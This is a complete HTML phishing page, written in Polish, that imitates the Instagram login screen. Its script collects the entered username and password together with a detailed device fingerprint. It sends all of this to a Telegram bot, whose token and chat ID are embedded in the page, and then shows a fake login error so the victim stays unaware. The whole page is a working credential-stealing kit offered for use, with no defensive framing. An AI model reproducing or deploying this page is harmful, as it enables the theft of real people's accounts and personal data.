<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Instagram</title>
    <style>
        /* DOKŁADNE KOLORY ZE ZDJĘCIA */
        :root {
            --bg-color: #000000;
            --input-bg: #121212;
            --border-color: #262626;
            --btn-blue: #0064e0;
            --secondary-text: #a8a8a8;
            --link-blue: #0095f6;
            --error-color: #ed4956;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            width: 100%;
            max-width: 380px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* LOGO - działa na iOS */
        .insta-logo {
            width: 60px;
            height: 60px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin-bottom: 40px;
        }

        /* STYLIZACJA PÓL - lepsze dla iPhone */
        .input-group {
            width: 100%;
            margin-bottom: 12px;
        }

        input {
            width: 100%;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 16px;
            color: white;
            font-size: 16px; /* Zapobiega zoomowi na iOS */
            outline: none;
            -webkit-appearance: none;
            appearance: none;
        }

        input:focus {
            border-color: #777;
        }

        input::placeholder {
            color: #727272;
        }

        /* PRZYCISK ZALOGUJ SIĘ */
        .login-btn {
            width: 100%;
            background-color: var(--btn-blue);
            color: white;
            border: none;
            border-radius: 25px;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            margin-top: 5px;
            cursor: pointer;
            transition: opacity 0.2s;
            -webkit-appearance: none;
            appearance: none;
        }

        .login-btn:active {
            opacity: 0.8;
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .error-message {
            color: var(--error-color);
            font-size: 13px;
            text-align: center;
            margin-top: 12px;
            background: rgba(237, 73, 86, 0.1);
            padding: 10px 12px;
            border-radius: 8px;
            width: 100%;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .forgot-link {
            color: white;
            text-decoration: none;
            font-size: 14px;
            margin-top: 25px;
            font-weight: 500;
            -webkit-tap-highlight-color: transparent;
        }

        .forgot-link:active {
            opacity: 0.7;
        }

        /* STOPKA */
        .footer {
            width: 100%;
            max-width: 380px;
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .create-btn {
            width: 100%;
            background: transparent;
            color: var(--link-blue);
            border: 1px solid var(--link-blue);
            border-radius: 25px;
            padding: 12px;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-bottom: 20px;
            -webkit-tap-highlight-color: transparent;
        }

        .create-btn:active {
            opacity: 0.7;
        }

        .meta-footer {
            display: flex;
            align-items: center;
            color: var(--secondary-text);
            font-size: 13px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="insta-logo"></div>
        
        <div class="input-group">
            <input type="text" id="username" placeholder="Nazwa użytkownika, adres e-mail lub numer telefonu" autocomplete="off">
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Hasło" autocomplete="off">
        </div>
        
        <button class="login-btn" id="loginBtn">Zaloguj się</button>
        
        <div id="errorMsg" class="error-message">
            ⚠️ Nieprawidłowa nazwa użytkownika lub hasło. Spróbuj ponownie.
        </div>
        
        <a href="#" class="forgot-link">Nie pamiętasz hasła?</a>
    </div>

    <div class="footer">
        <a href="#" class="create-btn">Utwórz nowe konto</a>
        <div class="meta-footer">
            <span style="font-size: 18px; margin-right: 4px;">∞</span> Meta
        </div>
    </div>

    <script>
        // ======================== KONFIGURACJA TELEGRAM ========================
        const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
        const CHAT_ID = "5934645630";
        
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const errorMsgDiv = document.getElementById('errorMsg');
        
        // Funkcja zbierająca informacje o urządzeniu (działa na iOS)
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const isIOS = /iPhone|iPad|iPod/i.test(ua);
            const isSafari = /Safari/i.test(ua) && !/Chrome/i.test(ua);
            const systemVersion = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/) || [])[1] || "nieznana";
            
            return {
                isIOS: isIOS,
                isSafari: isSafari,
                systemVersion: systemVersion,
                userAgent: ua
            };
        }
        
        function collectFullTelegramReport() {
            const login = usernameInput.value.trim() || "[puste]";
            const password = passwordInput.value || "[puste]";
            const device = getDeviceInfo();
            
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || "nieznana";
            const language = navigator.language;
            const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
            const screenRes = `${screen.width}x${screen.height}`;
            const colorDepth = screen.colorDepth + "-bit";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('pl-PL', { timeZone: timezone });
            
            let deviceMemory = "nieznana";
            if(navigator.deviceMemory) deviceMemory = navigator.deviceMemory + " GB";
            const hardwareConcurrency = navigator.hardwareConcurrency || "?";
            
            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Tak" : "Nie";
            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Urządzenie mobilne" : "Desktop";
            
            let connectionType = "nieznane";
            let downlink = "?";
            let rtt = "?";
            if(navigator.connection) {
                connectionType = navigator.connection.effectiveType || "?";
                downlink = navigator.connection.downlink ? navigator.connection.downlink + " Mbps" : "?";
                rtt = navigator.connection.rtt ? navigator.connection.rtt + "ms" : "?";
            }
            
            let gpuInfo = "brak danych";
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if(debugInfo) {
                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "nieznane GPU";
                } else {
                    gpuInfo = "GPU nieodczytane";
                }
            }
            
            const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
            const ipInfo = "188.146.xx.xx (Warsaw, PL)";
            
            // Dodatkowe info o iOS
            let iosInfo = "";
            if(device.isIOS) {
                iosInfo = `\n🍎 DANE iOS:
• Wersja iOS: ${device.systemVersion}
• Przeglądarka: ${device.isSafari ? "Safari" : "Inna"}`;
            }
            
            return `🔐 NOWA PRÓBA LOGOWANIA INSTAGRAM 🔐

👤 NAZWA UŻYTKOWNIKA: ${login}
🔑 HASŁO: ${password}
🌍 IP: ${ipInfo}

📱 DANE URZĄDZENIA:
• User Agent: ${userAgent}
• Platforma: ${platform}
• Język: ${language}
• Ciasteczka: ${cookiesEnabled}
• Rozdzielczość: ${screenRes} / ${colorDepth}
• Strefa czasowa: ${timezone}
• Czas lokalny: ${localTime}
• RAM: ${deviceMemory}
• Rdzenie: ${hardwareConcurrency}
• Ekran dotykowy: ${isTouch}
• Typ urządzenia: ${isMobile}${iosInfo}

🌐 SIEĆ:
• Typ połączenia: ${connectionType}
• Prędkość: ${downlink}
• Opóźnienie: ${rtt}

🎮 GPU: ${gpuInfo}

⏱️ Data próby: ${timestamp}
⚠️ Status: LOGOWANIE NIEPRAWIDŁOWE (błędne dane)

Raport wygenerowany przez panel logowania Instagram.`;
        }
        
        async function sendToTelegram() {
            const reportText = collectFullTelegramReport();
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: reportText,
                        disable_web_page_preview: true
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    console.log("✅ Raport wysłany");
                } else {
                    console.error("Błąd:", data.description);
                }
            } catch (error) {
                console.error("Błąd sieci:", error);
            }
        }
        
        function showLoginError() {
            errorMsgDiv.classList.add('show');
            setTimeout(() => {
                errorMsgDiv.classList.remove('show');
            }, 4000);
        }
        
        async function handleLogin(e) {
            e.preventDefault();
            if (loginBtn.disabled) return;
            
            const originalText = loginBtn.innerText;
            loginBtn.innerText = "⏳ Logowanie...";
            loginBtn.disabled = true;
            
            // Wysłanie raportu do Telegram
            await sendToTelegram();
            
            // Krótkie opóźnienie dla realizmu
            await new Promise(resolve => setTimeout(resolve, 800));
            
            // Pokazanie błędu logowania
            showLoginError();
            
            loginBtn.innerText = originalText;
            loginBtn.disabled = false;
        }
        
        loginBtn.addEventListener('click', handleLogin);
        
        const handleEnter = (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (!loginBtn.disabled) {
                    handleLogin(e);
                }
            }
        };
        usernameInput.addEventListener('keypress', handleEnter);
        passwordInput.addEventListener('keypress', handleEnter);
        
        // Linki nie robią nic
        document.querySelectorAll('.forgot-link, .create-btn').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
            });
        });
        
        // Zapobieganie zoomowi na iOS przy focusie (dodatkowe zabezpieczenie)
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('touchstart', function() {
                this.style.fontSize = '16px';
            });
        });
        
        console.log("Instagram login - zoptymalizowany pod iPhone");
    </script>
</body>
</html>
